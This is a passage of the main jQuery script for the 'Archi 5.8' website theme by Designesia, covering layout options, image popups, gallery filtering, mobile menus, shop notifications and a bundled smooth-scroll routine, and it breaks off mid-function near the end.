// © Copyright 2023 - Archi 5.8 by Designesia 

jQuery(document).ready(function() {
    'use strict'; // use strict mode

    var preloader = 1; // 1 - enable, 0 - disable
    var smooth_scroll = 0; // 1 - enable, 0 - disable
    var de_header_style = 1; // 1 - solid, 2 - transparent
    var de_header_layout = 1; // 1 - default, 2 - extended
    var de_header_color = 1; // 1 - default, 2 - light style
    var de_header_sticky = 1; // 1 - sticky, 2 - scroll
    var de_header_mobile_sticky = 2; // 1 - sticky, 2 - scroll
    var de_menu_separator = 1; // 1 - dotted, 2 - border, 3 - circle, 4 - square, 5 - plus, 6 - strip, 0 - none
    var de_color_style = 1; // 1 - default, 2 - light style
    var de_font_style = 1; // 1 - default, 2 - alternate font style
    var de_force_mobile_menu = 0; // 1 - yes, 0 - no

    // init
    var mobile_menu_show = 0;
    var grid_size = 10;
    var col = 4;
    var tmp_col = col;
    var sr = 466 / 700;
    var $container = jQuery('#gallery');
    var v_count = '0';

    if (de_color_style == 2) {
        $('body').addClass('de_light');
    }
    if (de_font_style == 2) {
        $('head').append('<link rel="stylesheet" href="css/font-style-2.css" type="text/css" />');
    }
    if (de_header_style == 2) {
        $('header').addClass('transparent');
    }
    if (de_menu_separator == 1) {
        $('#mainmenu').addClass('dotted-separator');
    } else if (de_menu_separator == 2) {
        $('#mainmenu').addClass('line-separator');
    } else if (de_menu_separator == 3) {
        $('#mainmenu').addClass('circle-separator');
    } else if (de_menu_separator == 4) {
        $('#mainmenu').addClass('square-separator');
    } else if (de_menu_separator == 5) {
        $('#mainmenu').addClass('plus-separator');
    } else if (de_menu_separator == 6) {
        $('#mainmenu').addClass('strip-separator');
    } else if (de_menu_separator == 0) {
        $('#mainmenu').addClass('no-separator');
    }
    if (de_header_layout == 2) {
        $('header').addClass('de_header_2');
        $('header .info').show();
    }
    if (de_header_color == 2) {
        $('header').addClass('header-light');
    }
    if (de_header_sticky == 2) {
        $('header').addClass('header-scroll');
    }
    if (de_header_mobile_sticky == 1) {
        $('header').addClass('header-mobile-sticky');
    }
    if (de_force_mobile_menu == 1) {
        $('header').addClass('force-header-mobile');
    }

    /* load url */
    jQuery('#de__qv-loader').load('product-quick-view');

    // --------------------------------------------------
    // magnificPopup
    // --------------------------------------------------

   
    // image popup

    $('.image-popup-vertical-fit').magnificPopup({
        type: 'image',
        closeOnContentClick: true,
        mainClass: 'mfp-img-mobile',
        image: {
            verticalFit: true
        }

    });

    $('.image-popup-fit-width').magnificPopup({
        type: 'image',
        closeOnContentClick: true,
        image: {
            verticalFit: false
        }
    });

    $('.image-popup-no-margins').magnificPopup({
        type: 'image',
        closeOnContentClick: true,
        closeBtnInside: false,
        fixedContentPos: true,
        mainClass: 'mfp-no-margins mfp-with-zoom', // class to remove default margin from left and right side
        image: {
            verticalFit: true
        },
        zoom: {
            enabled: true,
            duration: 300 // don't foget to change the duration also in CSS
        }
    });

    $('.image-popup-gallery').magnificPopup({
        type: 'image',
        closeOnContentClick: false,
        closeBtnInside: false,
        mainClass: 'mfp-with-zoom mfp-img-mobile',
        image: {
            verticalFit: true,
            titleSrc: function(item) {
                return item.el.attr('title');
                //return item.el.attr('title') + ' &middot; <a class="image-source-link" href="'+item.el.attr('data-source')+'" target="_blank">image source</a>';
            }
        },
        gallery: {
            enabled: true
        }

    });

    $('.popup-gallery').magnificPopup({
        delegate: 'a',
        type: 'image',
        tLoading: 'Loading image #%curr%...',
        mainClass: 'mfp-img-mobile',
        gallery: {
            enabled: true,
            navigateByImgClick: true,
            preload: [0, 1] // Will preload 0 - before current, and 1 after the current image
        },
        image: {
            tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
            titleSrc: function(item) {
                return item.el.attr('title');
            }
        }
    });

    /* --------------------------------------------------
     * custom background
     * --------------------------------------------------*/
    function custom_bg() {
        $("*").css('background-color', function() {
            return jQuery(this).data('bgcolor');
        });
        $("body,div,section,span").css('background', function() {
            return jQuery(this).data('bgimage');
        });
        $("div,section").css('background-size', function() {
            return 'cover';
        });
    }

    // progress bar //
    function de_progress() {
        jQuery('.de-progress').each(function() {
            var pos_y = jQuery(this).offset().top;
            var value = jQuery(this).find(".progress-bar").attr('data-value');
            var topOfWindow = jQuery(window).scrollTop();
            if (pos_y < topOfWindow + 550) {
                jQuery(this).find(".progress-bar").animate({
                    'width': value
                }, "slow");
            }

            jQuery(this).find('.value').text(jQuery(this).find('.progress-bar').attr('data-value'));
        });
    }

    // wow jquery

    new WOW().init();

    // --------------------------------------------------
    // init
    // --------------------------------------------------
    function init_de() {

        enquire.register("screen and (max-width: 993px)", {
            match: function() {
                $('header').addClass("header-mobile");
            },
            unmatch: function() {
                $('header').removeClass("header-mobile");
            }
        });

        var $window = jQuery(window);
        jQuery('section[data-type="background"]').each(function() {
            var $bgobj = jQuery(this); // assigning the object

            jQuery(window).scroll(function() {

                enquire.register("screen and (min-width: 993px)", {
                    match: function() {
                        var yPos = -($window.scrollTop() / $bgobj.data('speed'));
                        var coords = '50% ' + yPos + 'px';
                        $bgobj.css({
                            backgroundPosition: coords
                        });
                    }
                });
            });
            document.createElement("article");
            document.createElement("section");
        });

        jQuery('.grid.border').css('padding-top', grid_size);
        jQuery('.grid.border').css('padding-left', grid_size);
    }

    function grid_gallery() {
        jQuery('.grid-item').each(function() {
            var this_col = Number(jQuery(this).parent().attr('data-col'));
            var this_gridspace = Number(jQuery(this).parent().attr('data-gridspace'));
            var this_ratio = eval($(this).parent().attr('data-ratio'));
            jQuery(this).parent().css('padding-left', this_gridspace);
            var w = (($(document).width() - (this_gridspace * this_col + 1)) / this_col) - (this_gridspace / this_col);
            var gi = $(this);
            var h = w * this_ratio;
            gi.css('width', w);
            gi.css('height', h);
            gi.find(".pf_title").css('margin-top', (h / 2) - 10);
            gi.css('margin-right', this_gridspace);
            gi.css('margin-bottom', this_gridspace);
            if (gi.hasClass('large')) {
                $(this).css('width', (w * 2) + this_gridspace);
                $(this).css('height', (h * 2) + this_gridspace);
            }
            if (gi.hasClass('large-width')) {
                $(this).css('width', (w * 2) + this_gridspace);
                $(this).css('height', h);
            }
            if (gi.hasClass('large-height')) {
                $(this).css('height', (h * 2) + this_gridspace);
                gi.find(".pf_title").css('margin-top', (h) - 20);
            }
        });
    }


    init_de();
    de_progress();
    grid_gallery();
    centery();


    // --------------------------------------------------
    // preloader
    // --------------------------------------------------

    if (preloader == 1) {
        //calling jPreLoader function with properties
        jQuery('body').jpreLoader({
            splashID: "#jSplash",
            splashFunction: function() { //passing Splash Screen script to jPreLoader
                jQuery('#jSplash').children('section').not('.selected').hide();
                jQuery('#jSplash').hide().fadeIn(800);
                init_de();
                var timer = setInterval(function() {
                    splashRotator();
                }, 1500);
            }
        }, function() { //jPreLoader callback function
            clearInterval();

            jQuery(function() {
                var v_url = document.URL;

                if (v_url.indexOf('#') != -1) {
                    var v_hash = v_url.substring(v_url.indexOf("#") + 1);


                    jQuery('html, body').animate({
                        scrollTop: jQuery('#' + v_hash).offset().top - 70
                    }, 200);
                    return false;
                }
            });


        });

        // End of jPreLoader script

        function splashRotator() {
            var cur = jQuery('#jSplash').children('.selected');
            var next = jQuery(cur).next();

            if (jQuery(next).length != 0) {
                jQuery(next).addClass('selected');
            } else {
                jQuery('#jSplash').children('section:first-child').addClass('selected');
                next = jQuery('#jSplash').children('section:first-child');
            }

            jQuery(cur).removeClass('selected').fadeOut(100, function() {
                jQuery(next).fadeIn(100);
            });
        }
    } else {
        $('body').css("display", "block");
    }


    // --------------------------------------------------

    // --------------------------------------------------
    // custom positiion
    // --------------------------------------------------

    function centery() {
        var mi = window.matchMedia("(min-width: 768px)");
        var ma = window.matchMedia("(max-width: 768px)");


        if (mi.matches) {
            var $doc_height = jQuery(window).innerHeight();
            jQuery('#homepage #content.content-overlay').css("margin-top", $doc_height);
            jQuery('.full-height').css("height", $doc_height);
            var picheight = jQuery('.center-y').css("height");
            picheight = parseInt(picheight, 10);
            jQuery('.center-y').css('margin-top', (($doc_height - picheight) / 2) - 90);
            jQuery('.full-height .de-video-container').css("height", $doc_height);
        }

        if (ma.matches) {
            jQuery('.full-height').css("max-height", '100%');
        }
    }



     // product click notification begin
    $("<div/>").attr('id', 'de_notif').appendTo('body');

    function de_atc(n) {
        $("#de_notif").html(n);
    };

    jQuery(".de__pcard .atr__wish-list").on("click", function() {

        var iteration = $(this).data('iteration') || 1;

        switch (iteration) {
            case 1:
                jQuery(this).addClass("active");
                $("#de_notif").removeClass("active");
                de_atc('Product added to wishlist');
                $("#de_notif").addClass("active");
                setTimeout(function() {
                    $("#de_notif").removeClass("active");
                }, 1500);
                break;
            case 2:
                jQuery(this).removeClass("active");
                $("#de_notif").addClass("active");
                de_atc('Product removed from wishlist');
                setTimeout(function() {
                    $("#de_notif").removeClass("active");
                }, 1500);
                break;
        }
        iteration++;
        if (iteration > 2) iteration = 1;
        $(this).data('iteration', iteration);

    });

    jQuery(".de__pcard .atr__add-cart").on("click", function() {

        $("#de_notif").removeClass("active");
        de_atc('Product added to cart');
        $("#de_notif").addClass("active");
        setTimeout(function() {
            $("#de_notif").removeClass("active");
        }, 1500);

    });
    // product click notification close


    // document on load
    jQuery(window).load(function() {

        video_autosize();
        grid_gallery();
        custom_bg();
        de_count();
        centery();
        $(".jarallax").jarallax();
        demo();

        // --------------------------------------------------
        // filtering gallery
        // --------------------------------------------------

        $container.isotope({
            itemSelector: '.item',
            filter: '*'
        });
        jQuery('#filters a').on("click", function() {
            var $this = jQuery(this);
            if ($this.hasClass('selected')) {
                return false;
            }
            var $optionSet = $this.parents();
            $optionSet.find('.selected').removeClass('selected');
            $this.addClass('selected');

            var selector = jQuery(this).attr('data-filter');
            $container.isotope({
                filter: selector
            });
            return false;
        });

        $('.grid').isotope({
            itemSelector: '.grid-item'
        });

        if (smooth_scroll == 1) {
            ! function() {
                var s, i, c, a, o = {
                        frameRate: 150,
                        animationTime: 600,
                        stepSize: 100,
                        pulseAlgorithm: !0,
                        pulseScale: 4,
                        pulseNormalize: 1,
                        accelerationDelta: 50,
                        accelerationMax: 3,
                        keyboardSupport: !0,
                        arrowScroll: 50,
                        fixedBackground: !0,
                        excluded: ""
                    },
                    p = o,
                    u = !1,
                    d = !1,
                    n = {
                        x: 0,
                        y: 0
                    },
                    f = !1,
                    m = document.documentElement,
                    l = [],
                    h = /^Mac/.test(navigator.platform),
                    w = {
                        left: 37,
                        up: 38,
                        right: 39,
                        down: 40,
                        spacebar: 32,
                        pageup: 33,
                        pagedown: 34,
                        end: 35,
                        home: 36
                    },
                    v = {
                        37: 1,
                        38: 1,
                        39: 1,
                        40: 1
                    };

                function y() {
                    if (!f && document.body) {
                        f = !0;
                        var e = document.body,
                            t = document.documentElement,
                            o = window.innerHeight,
                            n = e.scrollHeight;
                        if (m = 0 <= document.compatMode.indexOf("CSS") ? t : e, s = e, p.keyboardSupport && Y("keydown", x), top != self) d = !0;
                        else if (Q && o < n && (e.offsetHeight <= o || t.offsetHeight <= o)) {
                            var r, a = document.createElement("div");
                            a.style.cssText = "position:absolute; z-index:-10000; top:0; left:0; right:0; height:" + m.scrollHeight + "px", document.body.appendChild(a), c = function() {
                                r = r || setTimeout(function() {
                                    u || (a.style.height = "0", a.style.height = m.scrollHeight + "px", r = null)
                                }, 500)
                            }, setTimeout(c, 10), Y("resize", c);
                            if ((i = new R(c)).observe(e, {
                                    attributes: !0,
                                    childList: !0,
                                    characterData: !1
                                }), m.offsetHeight <= o) {
                                var l = document.createElement("div");
                                l.style.clear = "both", e.appendChild(l)
                            }
                        }
                        p.fixedBackground || u || (e.style.backgroundAttachment = "scroll", t.style.backgroundAttachment = "scroll")
                    }
                }
                var b = [],
                    g = !1,
                    r = Date.now();

                function S(d, f, m) {
                    if (function(e, t) {
                            e = 0 < e ? 1 : -1, t = 0 < t ? 1 : -1, n.x === e && n.y === t || (n.x = e, n.y = t, b = [], r = 0)
                        }(f, m), 1 != p.accelerationMax) {
                        var e = Date.now() - r;
                        if (e < p.accelerationDelta) {
                            var t = (1 + 50 / e) / 2;
                            1 < t && (t = Math.min(t, p.accelerationMax), f *= t, m *= t)
                        }
                        r = Date.now()
                    }
                    if (b.push({
                            x: f,
                            y: m,
                            lastX: f < 0 ? .99 : -.99,
                            lastY: m < 0 ? .99 : -.99,
                            start: Date.now()
                        }), !g) {
                        var o = q(),
                            h = d === o || d === document.body;
                        null == d.$scrollBehavior && function(e) {
                            var t = M(e);
                            if (null == B[t]) {
                                var o = getComputedStyle(e, "")["scroll-behavior"];
                                B[t] = "smooth" == o
                            }
                            return B[t]
                        }(d) && (d.$scrollBehavior = d.style.scrollBehavior, d.style.scrollBehavior = "auto");
                        var w = function(e) {
                            for (var t = Date.now(), o = 0, n = 0, r = 0; r < b.length; r++) {
                                var a = b[r],
                                    l = t - a.start,
                                    i = l >= p.animationTime,
                                    c = i ? 1 : l / p.animationTime;
                                p.pulseAlgorithm && (c = F(c));
                                var s = a.x * c - a.lastX >> 0,
                                    u = a.y * c - a.lastY >> 0;
                                o += s, n += u, a.lastX += s, a.lastY += u, i && (b.splice(r, 1), r--)
                            }
                            h ? window.scrollBy(o, n) : (o && (d.scrollLeft += o), n && (d.scrollTop += n)), f || m || (b = []), b.length ? j(w, d, 1e3 / p.frameRate + 1) : (g = !1, null != d.$scrollBehavior && (d.style.scrollBehavior = d.$scrollBehavior, d.$scrollBehavior = null))
                        };
                        j(w, d, 0), g = !0
                    }
                }

                function e(e) {
                    f || y();
                    var t = e.target;
                    if (e.defaultPrevented || e.ctrlKey) return !0;
                    if (N(s, "embed") || N(t, "embed") && /\.pdf/i.test(t.src) || N(s, "object") || t.shadowRoot) return !0;
                    var o = -e.wheelDeltaX || e.deltaX || 0,
                        n = -e.wheelDeltaY || e.deltaY || 0;
                    h && (e.wheelDeltaX && K(e.wheelDeltaX, 120) && (o = e.wheelDeltaX / Math.abs(e.wheelDeltaX) * -120), e.wheelDeltaY && K(e.wheelDeltaY, 120) && (n = e.wheelDeltaY / Math.abs(e.wheelDeltaY) * -120)), o || n || (n = -e.wheelDelta || 0), 1 === e.deltaMode && (o *= 40, n *= 40);
                    var r = z(t);
                    return r ? !! function(e) {
                        if (!e) return;
                        l.length || (l = [e, e, e]);
                        e = Math.abs(e), l.push(e), l.shift(), clearTimeout(a), a = setTimeout(function() {
                            try {
                                localStorage.SS_deltaBuffer = l.join(",")
                            } catch (e) {}
                        }, 1e3);
                        var t = 120 < e && P(e),
                            o = !P(120) && !P(100) && !t;
                        return e < 50 || o
                    }(n) || (1.2 < Math.abs(o) && (o *= p.stepSize / 120), 1.2 < Math.abs(n) && (n *= p.stepSize / 120), S(r, o, n), e.preventDefault(), void C()) : !d || !W || (Object.defineProperty(e, "target", {
                        value: window.frameElement
                    }), parent.wheel(e))
                }

                function x(e) {
                    var t = e.target,
                        o = e.ctrlKey || e.altKey || e.metaKey || e.shiftKey && e.keyCode !== w.spacebar;
                    document.body.contains(s) || (s = document.activeElement);
                    var n = /^(button|submit|radio|checkbox|file|color|image)$/i;
                    if (e.defaultPrevented || /^(textarea|select|embed|object)$/i.test(t.nodeName) || N(t, "input") && !n.test(t.type) || N(s, "video") || function(e) {
                            var t = e.target,
                                o = !1;
                            if (-1 != document.URL.indexOf("www.youtube.com/watch"))
                                do {
                                    if (o = t.classList && t.classList.contains("html5-video-controls")) break
                                } while (t = t.parentNode);
                            return o
                        }(e) || t.isContentEditable || o) return !0;
                    if ((N(t, "button") || N(t, "input") && n.test(t.type)) && e.keyCode === w.spacebar) return !0;
                    if (N(t, "input") && "radio" == t.type && v[e.keyCode]) return !0;
                    var r = 0,
                        a = 0,
                        l = z(s);
                    if (!l) return !d || !W || parent.keydown(e);
                    var i = l.clientHeight;
                    switch (l == document.body && (i = window.innerHeight), e.keyCode) {
                        case w.up:
                            a = -p.arrowScroll;
                            break;
                        case w.down:
                            a = p.arrowScroll;
                            break;
                        case w.spacebar:
                            a = -(e.shiftKey ? 1 : -1) * i * .9;
                            break;
                        case w.pageup:
                            a = .9 * -i;
                            break;
                        case w.pagedown:
                            a = .9 * i;
                            break;
                        case w.home:
                            l == document.body && document.scrollingElement && (l = document.scrollingElement), a = -l.scrollTop;
                            break;
                        case w.end:
                            var c = l.scrollHeight - l.scrollTop - i;
                            a = 0 < c ? 10 + c : 0;
                            break;
                        case w.left:
                            r = -p.arrowScroll;
                            break;
                        case w.right:
                            r = p.arrowScroll;
                            break;
                        default:
                            return !0
                    }
                    S(l, r, a), e.preventDefault(), C()
                }

                function t(e) {
                    s = e.target
                }
                var k, D, M = (k = 0, function(e) {
                        return e.uniqueID || (e.uniqueID = k++)
                    }),
                    E = {},
                    T = {},
                    B = {};

                function C() {
                    clearTimeout(D), D = setInterval(function() {
                        E = T = B = {}
                    }, 1e3)
                }

                function H(e, t, o) {
                    for (var n = o ? E : T, r = e.length; r--;) n[M(e[r])] = t;
                    return t
                }

                function z(e) {
                    var t = [],
                        o = document.body,
                        n = m.scrollHeight;
                    do {
                        var r = (!1 ? E : T)[M(e)];
                        if (r) return H(t, r);
                        if (t.push(e), n === e.scrollHeight) {
                            var a = O(m) && O(o) || X(m);
                            if (d && L(m) || !d && a) return H(t, q())
                        } else if (L(e) && X(e)) return H(t, e)
                    } while (e = e.parentElement)
                }

                function L(e) {
                    return e.clientHeight + 10 < e.scrollHeight
                }

                function O(e) {
                    return "hidden" !== getComputedStyle(e, "").getPropertyValue("overflow-y")
                }

                function X(e) {
                    var t = getComputedStyle(e, "").getPropertyValue("overflow-y");
                    return "scroll" === t || "auto" === t
                }

                function Y(e, t, o) {
                    window.addEventListener(e, t, o || !1)
                }

                function A(e, t, o) {
                    window.removeEventListener(e, t, o || !1)
                }

                function N(e, t) {
                    return e && (e.nodeName || "").toLowerCase() === t.toLowerCase()
                }
                if (window.localStorage && localStorage.SS_deltaBuffer) try {
                    l = localStorage.SS_deltaBuffer.split(",")
                } catch (e) {}

                function K(e, t) {
                    return Math.floor(e / t) == e / t
                }

                function P(e) {
                    return K(l[0], e) && K(l[1], e) && K(l[2], e)
                }
                var $, j = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(e, t, o) {
                        window.setTimeout(e, o || 1e3 / 60)
                    },
                    R = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver,
                    q = ($ = document.scrollingElement, function() {
                        if (!$) {
                            var e = document.createElement("div");
                            e.style.cssText = "height:10000px;width:1px;", document.body.appendChild(e);
                            var t = document.body.scrollTop;
                            document.documentElement.scrollTop, window.scrollBy(0, 3), $ = document.body.scrollTop != t ? document.body : document.documentElement, window.scrollBy(0, -3), document.body.removeChild(e)
                        }
                        return $
                    });

                function V(e) {
                    var t;
                    return ((e *= p.pulseScale) < 1 ? e - (1 - Math.exp(-e)) : (e -= 1, (t = Math.exp(-1)) + (1 - Math.exp(-e)) * (1 - t))) * p.pulseNormalize
                }

                function F(e) {
                    return 1 <= e ? 1 : e <= 0 ? 0 : (1 == p.pulseNormalize && (p.pulseNormalize /= V(1)), V(e))
                }
                var I = window.navigator.userAgent,
                    _ = /Edge/.test(I),
                    W = /chrome/i.test(I) && !_,
                    U = /safari/i.test(I) && !_,
                    G = /mobile/i.test(I),
                    J = /Windows NT 6.1/i.test(I) && /rv:11/i.test(I),
                    Q = U && (/Version\/8/i.test(I) || /Version\/9/i.test(I)),
                    Z = (W || U || J) && !G,
                    ee = !1;
                try {
                    window.addEventListener("test", null, Object.defineProperty({}, "passive", {
                        get: function() {
                            ee = !0
                        }
                    }))
                } catch (e) {}
                var te = !!ee && {
                        passive: !1
                    },
                    oe = "onwheel" in document.createElement("div") ? "wheel" : "mousewheel";

                function ne(e) {
                    for (var t in e) o.hasOwnProperty(t) && (p[t] = e[t])
                }
                oe && Z && (Y(oe, e, te), Y("mousedown", t), Y("load", y)), ne.destroy = function() {
                    i && i.disconnect(), A(oe, e), A("mousedown", t), A("keydown", x), A("resize", c), A("load", y)
                }, window.SmoothScrollOptions && ne(window.SmoothScrollOptions), "function" == typeof define && define.amd ? define(function() {
                    return ne
                }) : "object" == typeof exports ? module.exports = ne : window.SmoothScroll = ne
            }();
        }

        /* mo-menu begin */


        jQuery('#mo-menu li').on("click", function() {

            var iteration = $(this).data('iteration') || 1;

            switch (iteration) {
                case 1:
                    $(this).children('ul').addClass('full');
                    break;
                case 2:
                    $(this).children('ul').removeClass('full');
                    break;
            }
            iteration++;
            if (iteration > 2) iteration = 1;
            $(this).data('iteration', iteration);

        });

        jQuery('#mo-button-open').on("click", function() {
            jQuery('#menu-overlay').fadeIn();
            jQuery('#menu-overlay').css("top", "0");

            /*$("#mo-menu  > li").each(function(i) {
                $(this).animate({
                    'opacity': '1',
                }, 10*i);
            });*/

            $("#mo-menu li").finish().delay(500).each(function(i) {
                $(this).finish().delay(200 + (100 * i)).queue(function() {
                    $(this).addClass("show");
                })
            })

        });

        jQuery('#mo-button-close').on("click", function() {
            jQuery('#menu-overlay').fadeOut();
            $("#mo-menu li").finish().delay(500).each(function(i) {
                $(this).finish().delay(100 * i).queue(function() {
                    $(this).removeClass("show");
                })
            })
            if (jQuery('#menu-overlay').hasClass("slideDown")) {
                jQuery('#menu-overlay').css("top", "-100%");
            }
        });

        jQuery('#mo-menu a').on("click", function() {

            if (this.href.indexOf('#') != -1) {
                jQuery('#menu-overlay').fadeOut();
                $("#mo-menu  > li").each(function(i) {
                    $(this).animate({
                        'opacity': '0',
                    }, 150 * i);
                });
                if (jQuery('#menu-overlay').hasClass("slideDown")) {
                    jQuery('#menu-overlay').css("top", "-100%");
                }
            }

        });
        /* mo-menu close */

        // --------------------------------------------------
        // revolution slider
        // --------------------------------------------------
        (function($) {
            // You pass-in jQuery and then alias it with the $-sign
            // So your internal code doesn't change
        })(jQuery);


        // --------------------------------------------------
        // navigation for mobile
        // --------------------------------------------------



        jQuery('#menu-btn').on("click", function() {
            if (mobile_menu_show == 0) {
                jQuery('#mainmenu').slideDown();
                jQuery('header').addClass('height-auto');
                jQuery('.force-header-mobile').css('max-height', '100%');
                mobile_menu_show = 1;
                jQuery(this).removeClass("unclick");
                jQuery(this).addClass("clicked");
            } else {
                $('#mainmenu').slideUp('fast', function() {
                    jQuery('header').removeClass('height-auto');
                    jQuery('.force-header-mobile').css('max-height', '80px');
                    mobile_menu_show = 0;
                });
                jQuery(this).removeClass("clicked");
                jQuery(this).addClass("unclick");
            }
        });

        // close menu when click for onepage on mobile (added 17/04/23)
        jQuery("header.header-mobile #mainmenu a").click(function(evn) {
            if (this.href.indexOf('#') != -1) {
                evn.preventDefault();
                $(this).parent().parent().hide('fast', function() {
                    jQuery('header').removeClass('height-auto');
                    jQuery('.force-header-mobile').css('max-height', '80px');
                    mobile_menu_show = 0;
                });
                jQuery("#menu-btn").removeClass("clicked");
                jQuery("#menu-btn").addClass("unclick");
            }
        });

        // one page navigation
        /**
         * This part causes smooth scrolling using scrollto.js
         * We target all a tags inside the nav, and apply the scrollto.js to it.
         */

        jQuery("#homepage nav a, .scroll-to, #mo-menu a").click(function(evn) {

            if (this.href.indexOf('#') != -1) {
                evn.preventDefault();
                jQuery('html,body').scrollTo(this.hash, this.hash);
            }
        });

        jQuery("a.btn").click(function(evn) {

            if (this.href.indexOf('#') != -1) {
                evn.preventDefault();
                jQuery('html,body').scrollTo(this.hash, this.hash);
            }
        });

        jQuery(".pop-search-click").on("click", function() {
            var iteration = $(this).data('iteration') || 1;
            switch (iteration) {
                case 1:
                    jQuery(this).addClass("click");
                    jQuery('.pop-search .form-default').fadeTo(300, 1);
                    jQuery('.pop-search .form-default input').focus();
                    break;
                case 2:
                    jQuery(this).removeClass("click");
                    jQuery('.pop-search .form-default').hide();
                    break;
            }
            iteration++;
            if (iteration > 2) iteration = 1;
            $(this).data('iteration', iteration);
        });

        jQuery('.de-gallery .item .icon-info').on("click", function() {
            jQuery('.page-overlay').show();
            url = jQuery(this).attr("data-value");

            jQuery("#loader-area .project-load").load(url, function() {
                jQuery("#loader-area").slideDown(500, function() {
                    jQuery('.page-overlay').hide();
                    jQuery('html, body').animate({
                        scrollTop: jQuery('#loader-area').offset().top - 70
                    }, 500, 'easeOutCubic');

                    //

                    jQuery(".image-slider").owlCarousel({
                        items: 1,
                        singleItem: true,
                        navigation: false,
                        pagination: true,
                        autoPlay: false
                    });

                    jQuery(".container").fitVids();

                    jQuery('#btn-close-x').on("click", function() {
                        jQuery("#loader-area").slideUp(500, function() {
                            jQuery('html, body').animate({
                                scrollTop: jQuery('#section-portfolio').offset().top - 70
                            }, 500, 'easeOutCirc');
                        });

                        return false;

                    });

                });
            });
        });

        jQuery('.de-gallery .item').on("click", function() {
            $('#navigation').show();
        });


        jQuery('#btn-close-quick-view').on("click", function() {
            $(".de__quick-view").fadeOut("normal", function() {
                $(this).hide();
                $('html,body').removeClass("no-scroll");
            });
        });

        jQuery('.atr__quick-view').on("click", function() {
            $(".de__quick-view").fadeIn("normal");
            $('html,body').addClass("no-scroll");
            var url = $(this).data("url");
            jQuery('#de__qv-loader').load(url);
        });

        // --------------------------------------------------
        // custom page with background on side
        // --------------------------------------------------
        jQuery('.side-bg').each(function() {
            jQuery(this).find(".image-container").css("height", jQuery(this).find(".image-container").parent().css("height"));
        });

        var target = $('.center-y');
        var targetHeight = target.outerHeight();

        jQuery('.animated').fadeTo(0, 0);
        jQuery('.animated').each(function() {
            var imagePos = jQuery(this).offset().top;
            var timedelay = jQuery(this).attr('data-delay');

            var topOfWindow = jQuery(window).scrollTop();
            if (imagePos < topOfWindow + 300) {
                jQuery(this).fadeTo(1, 500);
                var $anim = jQuery(this).attr('data-animation');
            }
        });


        // btn arrow up
        jQuery(".arrow-up").on("click", function() {
            jQuery(".coming-soon .coming-soon-content").fadeOut("medium", function() {
                jQuery("#hide-content").fadeIn(600, function() {
                    jQuery('.arrow-up').animate({
                        'bottom': '-40px'
                    }, "slow");
                    jQuery('.arrow-down').animate({
                        'top': '0'
                    }, "slow");
                });
            });
        });

        // btn arrow down
        jQuery(".arrow-down").on("click", function() {
            jQuery("#hide-content").fadeOut("slow", function() {
                jQuery(".coming-soon .coming-soon-content").fadeIn(800, function() {
                    jQuery('.arrow-up').animate({
                        'bottom': '0px'
                    }, "slow");
                    jQuery('.arrow-down').animate({
                        'top': '-40'
                    }, "slow");
                });
            });
        });

        // document scroll //
        jQuery(document).scroll(function() {
            var scrollPercent = (targetHeight - window.scrollY) / targetHeight;
            if (scrollPercent >= 0) {
                target.css('opacity', scrollPercent);
            }

            if (location.hash !== "") {
                jQuery('#homepage nav li a').each(function() {
                    if (this.href.indexOf('#') != -1) {
                        var href = jQuery(this).attr('href');
                        if (jQuery(window).scrollTop() > jQuery(href).offset().top - 140) {
                            jQuery('nav li a').removeClass('active');
                            jQuery(this).addClass('active');
                        }
                    }
                });
            }

            de_count();

            jQuery('.animated').each(function() {
                var imagePos = jQuery(this).offset().top;
                var timedelay = jQuery(this).attr('data-delay');

                var topOfWindow = jQuery(window).scrollTop();
                if (imagePos < topOfWindow + 500) {
                    jQuery(this).delay(timedelay).queue(function() {
                        jQuery(this).fadeTo(1, 500);
                        var $anim = jQuery(this).attr('data-animation');
                        jQuery(this).addClass($anim).clearQueue();
                    });

                }
            });

            jQuery(".nav-exit").on("click", function() {
                $.magnificPopup.close();
            });

        }); // document scroll end //

        $.stellar({
            horizontalScrolling: false,
            verticalOffset: 0
        });

    }); // document load end //


    // mainmenu create span
    jQuery('#mainmenu li a').each(function() {
        if ($(this).next("ul").length > 0) {
            $("<span></span>").insertAfter($(this));
        }
    });

    // mainmenu arrow click
    jQuery("#mainmenu > li > span").on("click", function() {
        var iteration = $(this).data('iteration') || 1;
        switch (iteration) {
            case 1:
                $(this).addClass("active");
                $(this).parent().find("ul:first").css("height", "auto");
                var curHeight = $(this).parent().find("ul:first").height();
                $(this).parent().find("ul:first").css("height", "0");
                $(this).parent().find("ul:first").animate({
                    'height': curHeight
                }, 400, 'easeInOutQuint');

                break;

            case 2:
                $(this).removeClass("active");
                $(this).parent().find("ul:first").animate({
                    'height': "0"
                }, 400, 'easeInOutQuint');
                break;
        }
        iteration++;
        if (iteration > 2) iteration = 1;
        $(this).data('iteration', iteration);
    });

    jQuery("#mainmenu > li > ul > li > span").on("click", function() {
        var iteration = $(this).data('iteration') || 1;
        switch (iteration) {
            case 1:
                $(this).addClass("active");
                $(this).parent().find("ul:first").css("height", "auto");
                $(this).parent().parent().parent().find("ul:first").css("height", "auto");
                var curHeight = $(this).parent().find("ul:first").height();
                $(this).parent().find("ul:first").css("height", "0");
                $(this).parent().find("ul:first").animate({
                    'height': curHeight
                }, 400, 'easeInOutQuint');

                break;

            case 2:
                $(this).removeClass("active");
                $(this).parent().find("ul:first").animate({
                    'height': "0"
                }, 400, 'easeInOutQuint');
                break;
        }
        iteration++;
        if (iteration > 2) iteration = 1;
        $(this).data('iteration', iteration);
    });

    jQuery("#mainmenu > li > ul > li > ul > li span").on("click", function() {
        var iteration = $(this).data('iteration') || 1;
        switch (iteration) {
            case 1:
                $(this).addClass("active");
                $(this).parent().find("ul:first").css("height", "auto");
                $(this).parent().parent().parent().find("ul:first").css("height", "auto");
                var curHeight = $(this).parent().find("ul:first").height();
                $(this).parent().find("ul:first").css("height", "0");
                $(this).parent().find("ul:first").animate({
                    'height': curHeight
                }, 400, 'easeInOutQuint');

                break;

            case 2:
                $(this).removeClass("active");
                $(this).parent().find("ul:first").animate({
                    'height': "0"
                }, 400, 'easeInOutQuint');
                break;
        }
        iteration++;
        if (iteration > 2) iteration = 1;
        $(this).data('iteration', iteration);
    });

    //jQUery('footer').append('<a href="#" id="back-to-top"></a>');

    if ($('#back-to-top').length) {
        var scrollTrigger = 500, // px
            backToTop = function() {
                var scrollTop = $(window).scrollTop();
